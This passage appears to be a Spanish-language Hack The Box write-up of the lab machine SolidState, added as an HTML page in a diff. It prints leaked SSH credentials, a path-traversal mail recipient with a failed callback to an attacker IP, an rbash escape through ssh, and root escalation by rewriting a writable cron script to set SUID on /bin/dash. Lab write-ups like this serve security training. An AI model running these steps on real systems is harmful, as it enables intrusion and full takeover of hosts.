++OK Message follows          
+Return-Path: &lt;mailadmin@localhost&gt;              
+Message-ID: &lt;5420213.0.1503422039826.JavaMail.root@solidstate&gt;                                                                   
+MIME-Version: 1.0                                               
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii     
+Content-Transfer-Encoding: 7bit                                 
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>                
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 798                                                               
+          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span>                                
+          Tue, 22 Aug 2017 13:13:42 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>                 
+Date: Tue, 22 Aug 2017 13:13:42 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>                     
+From: mailadmin@localhost                                                                                                        
+Subject: Welcome                                                                                                                 
+
+Dear Mindy,    
+Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critica
+l <span class="k">in </span>fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Securit
+y and provide resources that will <span class="nb">help </span>you make a smooth transition into your new role. The Cyber team is here to support your <span class="nb">tr
+</span>ansition so, please know that you can call on any of us to assist you.                                                           
+
+We are looking forward to you joining our team and your success at Solid State Security. 
+
+Respectfully,
+James
+<span class="nb">.</span>
+RETR 2  
++OK Message follows
+Return-Path: &lt;mailadmin@localhost&gt;
+Message-ID: &lt;16744123.2.1503422270399.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: mindy@localhost
+Received: from 192.168.11.142 <span class="o">([</span>192.168.11.142]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 581
+          <span class="k">for</span> &lt;mindy@localhost&gt;<span class="p">;</span> 
+          Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Tue, 22 Aug 2017 13:17:28 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: mailadmin@localhost
+Subject: Your Access
+
+Dear Mindy,
+
+
+Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
+Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 
+
+username: mindy
+pass: P@55W0rd1!2@
+
+Respectfully,
+James
+
+<span class="nb">.</span>
+</code></pre></div></div>
+
+<p>De acuerdo con el contenido de los correo, vemos unas credenciales de acceso por el servicio SSH, así que vamos a guardarlas y probarlas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh mindy@10.10.10.51
+The authenticity of host <span class="s1">'10.10.10.51 (10.10.10.51)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:njQxYC21MJdcSfcgKOpfTedDAXx50SYVGPCfChsGwI0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>10.10.10.51<span class="s1">' (ECDSA) to the list of known hosts.
+mindy@10.10.10.51'</span>s password: 
+Linux solidstate 4.9.0-3-686-pae <span class="c">#1 SMP Debian 4.9.30-2+deb9u3 (2017-08-06) i686</span>
+
+The programs included with the Debian GNU/Linux system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 22 14:00:02 2017 from 192.168.11.142
+<span class="nt">-rbash</span>: <span class="s1">$'</span><span class="se">\2</span><span class="s1">54</span><span class="se">\3</span><span class="s1">55</span><span class="se">\0</span><span class="s1">05sr</span><span class="se">\0</span><span class="s1">36org.apache.james.core.MailImpl</span><span class="se">\3</span><span class="s1">04x</span><span class="se">\r\3</span><span class="s1">45</span><span class="se">\2</span><span class="s1">74</span><span class="se">\3</span><span class="s1">17ݬ</span><span class="se">\0</span><span class="s1">03'</span>: <span class="nb">command </span>not found
+<span class="nt">-rbash</span>: L: <span class="nb">command </span>not found
+<span class="nt">-rbash</span>: attributestLjava/util/HashMap: No such file or directory
+<span class="nt">-rbash</span>: L
+         errorMessagetLjava/lang/String: No such file or directory
+<span class="nt">-rbash</span>: L
+         lastUpdatedtLjava/util/Date: No such file or directory
+<span class="nt">-rbash</span>: Lmessaget!Ljavax/mail/internet/MimeMessage: No such file or directory
+<span class="nt">-rbash</span>: <span class="s1">$'L</span><span class="se">\0</span><span class="s1">04nameq~</span><span class="se">\0</span><span class="s1">02L'</span>: <span class="nb">command </span>not found
+<span class="nt">-rbash</span>: recipientstLjava/util/Collection: No such file or directory
+<span class="nt">-rbash</span>: L: <span class="nb">command </span>not found
+<span class="nt">-rbash</span>: <span class="s1">$'remoteAddrq~</span><span class="se">\0</span><span class="s1">02L'</span>: <span class="nb">command </span>not found
+<span class="nt">-rbash</span>: remoteHostq~LsendertLorg/apache/mailet/MailAddress: No such file or directory
+<span class="nt">-rbash</span>: <span class="s1">$'L</span><span class="se">\0</span><span class="s1">05stateq~</span><span class="se">\0</span><span class="s1">02xpsr</span><span class="se">\0</span><span class="s1">35org.apache.mailet.MailAddress'</span>: <span class="nb">command </span>not found
+<span class="nt">-rbash</span>: <span class="s1">$'</span><span class="se">\2</span><span class="s1">21</span><span class="se">\2</span><span class="s1">22</span><span class="se">\2</span><span class="s1">04m</span><span class="se">\3</span><span class="s1">07{</span><span class="se">\2</span><span class="s1">44</span><span class="se">\0</span><span class="s1">02</span><span class="se">\0</span><span class="s1">03I</span><span class="se">\0</span><span class="s1">03posL</span><span class="se">\0</span><span class="s1">04hostq~</span><span class="se">\0</span><span class="s1">02L</span><span class="se">\0</span><span class="s1">04userq~</span><span class="se">\0</span><span class="s1">02xp'</span>: <span class="nb">command </span>not found
+<span class="nt">-rbash</span>: @team.pl&gt;
+Message-ID: &lt;9152149.0.1635800669443.JavaMail.root@solidstate&gt;
+MIME-Version: 1.0
+Content-Type: text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>us-ascii
+Content-Transfer-Encoding: 7bit
+Delivered-To: ../../../../../../../../etc/bash_completion.d@localhost
+Received: from 10.10.14.23 <span class="o">([</span>10.10.14.23]<span class="o">)</span>
+          by solidstate <span class="o">(</span>JAMES SMTP Server 2.3.2<span class="o">)</span> with SMTP ID 285
+          <span class="k">for</span> &lt;../../../../../../../../etc/bash_completion.d@localhost&gt;<span class="p">;</span>
+          Mon, 1 Nov 2021 17:03:49 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+Date: Mon, 1 Nov 2021 17:03:49 <span class="nt">-0400</span> <span class="o">(</span>EDT<span class="o">)</span>
+From: team@team.pl
+
+: No such file or directory
+<span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.14.23] 443 <span class="o">(</span>https<span class="o">)</span> : Connection refused
+<span class="nt">-rbash</span>: <span class="s1">$'</span><span class="se">\r</span><span class="s1">'</span>: <span class="nb">command </span>not found
+mindy@solidstate:~<span class="err">$</span>
+mindy@solidstate:~<span class="nv">$ </span><span class="nb">whoami</span>
+<span class="nt">-rbash</span>: <span class="nb">whoami</span>: <span class="nb">command </span>not found
+mindy@solidstate:~<span class="nv">$ </span>
+</code></pre></div></div>
+
+<p>Vemos que nos contramos en una <code class="language-plaintext highlighter-rouge">rbash</code> y nos limita los comandos que podemos ejecutar y podemos comprobarlo si ingresamos a la ruta <code class="language-plaintext highlighter-rouge">/home</code> del usuario <code class="language-plaintext highlighter-rouge">mindy</code> y vemos un directorio de nombre <code class="language-plaintext highlighter-rouge">bin</code> el cual tiene los binarios que podemos utilizar <code class="language-plaintext highlighter-rouge">cat</code>, <code class="language-plaintext highlighter-rouge">env</code> y <code class="language-plaintext highlighter-rouge">ls</code>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 8
+drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
+<span class="nt">-rw-------</span> 1 mindy mindy   33 Nov 18  2020 user.txt
+mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> bin/
+total 0
+lrwxrwxrwx 1 root root 8 Aug 22  2017 <span class="nb">cat</span> -&gt; /bin/cat
+lrwxrwxrwx 1 root root 8 Aug 22  2017 <span class="nb">env</span> -&gt; /bin/env
+lrwxrwxrwx 1 root root 7 Aug 22  2017 <span class="nb">ls</span> -&gt; /bin/ls
+mindy@solidstate:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Podríamos tratar de escapar de la <code class="language-plaintext highlighter-rouge">rbash</code> desde el comando <code class="language-plaintext highlighter-rouge">ssh</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh mindy@10.10.10.51 <span class="s2">"whoami"</span>
+mindy@10.10.10.51<span class="s1">'s password: 
+mindy
+</span></code></pre></div></div>
+
+<p>Vemos que a través de la herramienta <code class="language-plaintext highlighter-rouge">ssh</code> podemos ejecutar comandos que escapan de la <code class="language-plaintext highlighter-rouge">rbash</code>; asi que vamos a ejecutar una <code class="language-plaintext highlighter-rouge">bash</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh mindy@10.10.10.51 bash
+mindy@10.10.10.51<span class="s1">'s password: 
+whoami
+mindy
+</span></code></pre></div></div>
+
+<p>Para trabajar mas cómodos, hacemos un <a href="/tratamiento-tty">Tratamiento de la tty</a> con python:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whereis python
+python: /usr/bin/python /usr/bin/python2.7 /usr/bin/python3.5m /usr/bin/python3.5 /usr/lib/python2.7 /usr/lib/python3.5 /etc/python /etc/python2.7 /etc/python3.5 /usr/local/lib/python2.7 /usr/local/lib/python3.5 /usr/include/python2.7 /usr/include/python3.5m /usr/share/python /usr/share/man/man1/python.1.gz
+
+python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Y ahora si ya podemos visualizar la flag (user.txt) con una tty totalmente interactiva. Ahora necesitamos escalar privilegios, por lo que vamos a enumerar un poco el sistema.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">id
+</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>mindy<span class="o">)</span>
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+bash: <span class="nb">sudo</span>: <span class="nb">command </span>not found
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 8
+drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
+<span class="nt">-rw-------</span> 1 mindy mindy   33 Nov 18  2020 user.txt
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+total 28
+drwxr-x--- 4 mindy mindy 4096 Apr 26  2021 <span class="nb">.</span>
+drwxr-xr-x 4 root  root  4096 Apr 26  2021 ..
+lrwxrwxrwx 1 root  root     9 Nov 18  2020 .bash_history -&gt; /dev/null
+<span class="nt">-rw-r--r--</span> 1 root  root     0 Aug 22  2017 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 root  root   338 Aug 22  2017 .bash_profile
+<span class="nt">-rw-r--r--</span> 1 root  root  1001 Aug 22  2017 .bashrc
+<span class="nt">-rw-------</span> 1 root  root     0 Aug 22  2017 .rhosts
+<span class="nt">-rw-------</span> 1 root  root     0 Aug 22  2017 .shosts
+drw------- 2 root  root  4096 Apr 26  2021 .ssh
+drwxr-x--- 2 mindy mindy 4096 Apr 26  2021 bin
+<span class="nt">-rw-------</span> 1 mindy mindy   33 Nov 18  2020 user.txt
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:~<span class="nv">$ </span><span class="nb">cd</span> /
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/<span class="nv">$ </span>find <span class="se">\-</span>perm 4000 2&gt;/dev/null
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/<span class="err">$</span>
+</code></pre></div></div>
+
+<p>No vemos nada interesante. Asi que vamos a listar los procesos que se ejecutar en tiempos regualares de tiempo con nuestra herramienta <a href="/procmon">ProcMon</a>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/home/james<span class="nv">$ </span><span class="nb">cd</span> /dev/shm/
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span>nano procmon.sh
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span><span class="nb">chmod</span> +x procmon.sh 
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span>./procmon.sh 
+<span class="o">&gt;</span> /usr/sbin/CRON <span class="nt">-f</span>
+<span class="o">&gt;</span> /bin/sh <span class="nt">-c</span> python /opt/tmp.py
+<span class="o">&gt;</span> python /opt/tmp.py
+&lt; /usr/sbin/CRON <span class="nt">-f</span>
+&lt; /bin/sh <span class="nt">-c</span> python /opt/tmp.py
+&lt; python /opt/tmp.py
+^C
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que se está ejecutando el archivo <code class="language-plaintext highlighter-rouge">/opt/tmp.py</code>, así que vamos a echarle un ojo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/dev/shm<span class="nv">$ </span><span class="nb">cd</span> /opt/
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 8
+drwxr-xr-x 11 root root 4096 Apr 26  2021 james-2.3.2
+<span class="nt">-rwxrwxrwx</span>  1 root root  105 Aug 22  2017 tmp.py
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">cat </span>tmp.py
+<span class="c">#!/usr/bin/env python</span>
+import os
+import sys
+try:
+     os.system<span class="o">(</span><span class="s1">'rm -r /tmp/* '</span><span class="o">)</span>
+except:
+     sys.exit<span class="o">()</span>
+
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Vemos que el propietario es el usuario <strong>root</strong> y que el ejecutar el archivo, borra todo lo que se encuentre en <code class="language-plaintext highlighter-rouge">/tmp/</code>. Si vemos los permisos, tenemos privilegio de lectura, escritura y ejecución y como el usuario <strong>root</strong> ejecutar el archivo a en intervalos regualres, podemos modificar el contenido del script:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">cat </span>tmp.py 
+i#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system<span class="o">(</span><span class="s1">'chmod 4755 /bin/dash'</span><span class="o">)</span>
+except:
+     sys.exit<span class="o">()</span>
+
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/dash
+<span class="nt">-rwxr-xr-x</span> 1 root root 124492 Jan 24  2017 /bin/dash
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Esperamos un momento a que el usuario <strong>root</strong> ejecute el script y tenga permisos SUID la <code class="language-plaintext highlighter-rouge">/bin/dash</code> <em>Debian Almquist shell</em> (<strong>Nota</strong>: En caso de que no se obtenga el permiso SUID, se recomienda reinicar la máquina):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /bin/dash
+<span class="nt">-rwsr-xr-x</span> 1 root root 124492 Jan 24  2017 /bin/dash
+<span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Ya tenemos los permisos SUID en la <code class="language-plaintext highlighter-rouge">/bin/dash</code>, así que ejecutamos <code class="language-plaintext highlighter-rouge">dash</code> para acceder como <strong>root</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">${</span><span class="nv">debian_chroot</span>:+<span class="p">(</span><span class="nv">$debian_chroot</span><span class="p">)</span><span class="k">}</span>mindy@solidstate:/opt<span class="nv">$ </span>dash
+<span class="c"># whoami</span>
+root
+<span class="c"># </span>
+</code></pre></div></div>
+
+<p>Ya somo el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#file-misconfiguration" class="page__taxonomy-item" rel="tag">File_Misconfiguration</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#medium" class="page__taxonomy-item" rel="tag">Medium</a>
+    
+    </span>
+  </p>
+
+
+        
+          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021</time></p>
+        
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/htb-devel/" class="pagination--pager" title="Hack The Box Devel
+">Previous</a>
+    
+    
+      <a href="/htb-tally/" class="pagination--pager" title="Hack The Box Tally
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+</div>
+
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2021 K4miyo</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>
+
+
+
+
+
+
+
+
+  </body>
+</html>
